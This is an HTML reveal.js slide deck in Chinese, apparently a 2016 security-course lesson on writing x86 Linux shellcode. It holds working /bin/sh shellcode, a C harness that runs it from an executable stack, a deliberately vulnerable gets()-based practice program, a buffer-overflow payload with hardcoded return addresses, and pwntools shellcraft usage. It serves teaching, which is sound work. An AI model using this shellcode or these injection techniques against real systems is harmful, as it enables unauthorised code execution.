@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'>
+    <meta charset='utf-8'>
+    <title>Shellcode</title>
+    <meta content='yes' name='apple-mobile-web-app-capable'>
+    <meta content='black-translucent' name='apple-mobile-web-app-status-bar-style'>
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui' name='viewport'>
+    <link href='../../css/reveal.css' rel='stylesheet'>
+    <link href='../../css/theme/night.css' id='theme' rel='stylesheet'>
+    <!-- Code syntax highlighting -->
+    <link href='../../lib/css/zenburn.css' rel='stylesheet'>
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? '../../css/print/pdf.css' : '../../css/print/paper.css';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+    <!--[if lt IE 9]>
+      <script src="../../lib/js/html5shiv.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class='reveal'>
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class='slides'>
+        <section data-markdown data-separator="^\n---\n$" data-separator-vertical="^\n--\n$">
+          <script type="text/template">
+          #Shellcode
+
+          廖子慶  
+          2016/03/21 <!-- .element: align="right" -->
+
+          ---
+
+          ##About:shellcode
+
+          植入一段程式並執行  
+          因為通常拿來取得shell  
+          所以這段程式稱之為shellcode
+
+          --
+
+          [Shellcode DB](http://shell-storm.org/shellcode/) <!-- .element: target="blank" -->
+
+          有各種系統各種功能的Shellcode
+
+          ---
+
+          ##借用BamboFox 教材
+
+          ```sh
+          git clone https://github.com/bruce30262/x86_shellcode_tutorial.git
+          ```
+
+          Source by bruce30262
+
+          --
+
+          #從組合語言到機器碼
+
+          --
+
+          ##組譯方法
+
+          ```sh
+          nasm -f bin -o code shell.s
+          xxd -i code
+          ```
+
+          * type:bin  
+          * xxd:hex viewer
+          * -i: c include style
+
+          ```sh
+          make shellcode
+          ```
+
+          ---
+
+          ##Example_0
+
+          ```x86_asm
+          BITS 32
+
+          global _start
+
+          _start:
+            push 0x0068732f
+            push 0x6e69622f
+            mov ebx, esp
+
+            mov eax, 0xb
+            mov ecx, 0x0
+            mov edx, 0x0
+            int 0x80
+          ```
+          ```c
+          unsigned char code[] = {
+            0x68, 0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
+            0xb8, 0x0b, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00,
+            0x00, 0x00, 0x00, 0xcd, 0x80
+          };
+          unsigned int code_len = 29;
+          ```
+
+          --
+
+          ##利用C執行機器碼
+
+          ```c
+          //shell.c
+          unsigned char code[] = {
+              0x68, 0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
+              0xb8, 0x0b, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00,
+              0x00, 0x00, 0x00, 0xcd, 0x80
+          }; //shellcode
+
+          int main(int argc, char **argv)
+          {
+              int (*func)(); //指標
+              func = (int (*)()) code; //設定指標指向shellcode
+              (int)(*func)(); //執行指標所在的指令
+              return 0;
+          }
+          ```
+
+          ```sh
+          gcc -m32 -fno-stack-protector -z execstack -o shell.out shell.c #make cbin
+          ./shell.out
+          ```
+
+          ---
+
+          #常用到的技巧
+
+          --
+
+          #Nullfree_1
+
+          strycpy遇到null會以為字串結束
+
+          ```x86_asm
+          1.
+          設定值
+          mov eax,1; #-> mov eax,0x00000001 有null
+          mov al,1;  #-> mov al,0x01 沒null
+          2.
+          清空暫存器
+          mov ebx,0; #有null
+          xor ebx,ebx; #沒null
+          ```
+
+          shellcode應避免使用null byte
+
+          --
+
+          ##Open Read Write_3
+
+          在某些環境下不能使用shell,或是主辦有鎖權限
+          就必須學會基本的讀寫檔案
+
+          --
+
+          ##Open file
+
+          1. eax=5
+          1. ebx=esp(filename)
+          1. ecx=0
+          1. edx=0
+          1. int 0x80
+
+          --
+
+          ##Read file
+
+          1. ebx=eax(return fd)
+          1. eax=3
+          1. sub esp,0x50(buffer)
+          1. ecx=esp(buffer)
+          1. edx=0x50(sizeof(buffer))
+          1. int 0x80
+
+          --
+
+          ##Write file
+
+          1. edx=eax(return len)
+          1. eax=4
+          1. ebx=1(stdout)
+          1. nop(ecx=esp(buffer))
+          1. int 0x80
+
+          --
+
+          ##Alaphanumeric_4
+
+          如果限制輸入的範圍[a-zA-Z0-9]
+          就沒辦法輸入特殊字元
+
+          ---
+
+          ##課堂練習
+
+          ```c
+          //sc.c
+          #include <stdio.h>
+          char code[100];
+          int main(int argc, char **argv)
+          {
+              int (*func)();
+              gets(code);
+              //scanf("%s",code); challenge 2
+              func = (int (*)()) code;
+              (int)(*func)();
+              return 0;
+          }
+          ```
+
+          嘗試“輸入”一段shellcode並執行
+
+          --
+
+          ##特殊檔案製作方法
+
+          ```sh
+          bless #hex editor for ubuntu
+          echo -e "\xab\xcd\xef" > shellcode #echo匯出法
+          ```
+
+          ```c
+          //c輸出法
+          #include <stdio.h>
+          int main() {
+              FILE *fp;
+              int filesize;
+              unsigned char buff[]=
+                  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30"
+                  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30"
+                  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30"
+                  "\x31\x32\x33\x34\x35"
+                  "\x98\xef\xff\xbf"
+                  "\xbb\xee\xff\xbf"
+                  "\x20\x31"
+                  "\x20\x31"
+                  "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0"
+                  "\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5"
+                  "\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63"
+                  "\x61\x6c";
+              fp = fopen("shellcode", "wb");
+              if (!fp) {
+                  fclose(fp);
+                  return -1;
+              }
+              fwrite(buff, sizeof(buff[0]), sizeof(buff)/sizeof(buff[0]), fp);
+              fclose(fp);
+              return 0;
+          }
+          ```
+
+          --
+
+          ##使用檔案輸入stdin
+
+          ```sh
+          ./sc < shellcode #fileinput
+          cat shellcode - | ./sc #pipe
+          ```
+
+          --
+
+          ##使用ncat掛接
+
+          ```sh
+          ncat -vc ./sc -kl 8888
+          ```
+
+          ```python
+          from pwm import *
+          r = remote('127.0.0.1',8888)
+          shellcode="\xab\xcd\xef"
+          r.send(shellcode+"\n")
+          r.interactive()
+          r.close()
+          ```
+
+          ---
+
+          ##補充 pwnlib shellcode
+
+          ```python
+          from pwn import *
+          context.arch="i386" #依系統改變 預設i386
+          print shellcraft.sh(); #取得shellcode asm
+          print asm(shellcraft.sh()) #asm()會組譯shellcode
+          ```
+
+          --
+
+          #Demo
+
+          --
+
+          #END
+
+          </script>
+        </section>
+      </div>
+    </div>
+    <script src='../../lib/js/head.min.js'></script>
+    <script src='../../js/reveal.js'></script>
+    <script>
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+      	controls: true,
+        progress: true,
+        history: true,
+        slideNumber: true,
+        center: true,
+        keyboard: true,
+        overview: true,
+
+        // The "normal" size of the presentation, aspect ratio will be preserved
+        // when the presentation is scaled to fit different resolutions. Can be
+        // specified using percentage units.
+        width: 1024,
+        height: 768,
+        // Bounds for smallest/largest possible scale to apply to content
+        minScale: 0.1,
+        maxScale: 1.0,
+
+      	transition: 'convex', // none/fade/slide/convex/concave/zoom
+
+      	// Optional reveal.js plugins
+      	dependencies: [
+      		{ src: '../../lib/js/classList.js', condition: function() { return !document.body.classList; } },
+      		{ src: '../../plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      		{ src: '../../plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+            { src: '../../plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+      		{ src: '../../plugin/zoom-js/zoom.js', async: true },
+      		{ src: '../../plugin/notes/notes.js', async: true }
+      	]
+      });
+    </script>
+  </body>
+</html>
